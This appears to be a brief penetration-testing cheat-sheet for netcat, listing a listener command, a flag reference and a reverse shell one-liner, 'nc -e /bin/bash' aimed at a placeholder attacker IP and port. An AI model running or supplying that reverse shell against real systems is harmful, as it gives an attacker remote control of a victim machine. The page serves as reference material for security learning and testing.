---
title: NETCAT
summary: A featured networking utility which reads and writes data across network connections.
description: A featured networking utility which reads and writes data across network connections.
---

[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)

## NETCAT Listener


 > 
 > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
 > Open a listener on delected port.

## NETCAT Reverse Shell


 > 
 > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**</br>
 > Reverse shell. 

## NETCAT Flags


 > 
 > **<font color=red>-l</font>**</br>
 > Listener mode.
 > 
 > **<font color=red>-k</font>**</br>
 > Keep listening after client disconnects.
 > 
 > **<font color=red>-n</font>**</br>
 > No DNS (no more "unknown host").
 > 
 > **<font color=red>-v</font>**</br>
 > Verbose.
 > 
 > **<font color=red>-p</font> 2112**</br>
 > Port.
 > **<font color=red>-z</font>**</br>
 > Netcat will not send data (scan for listening daemons).
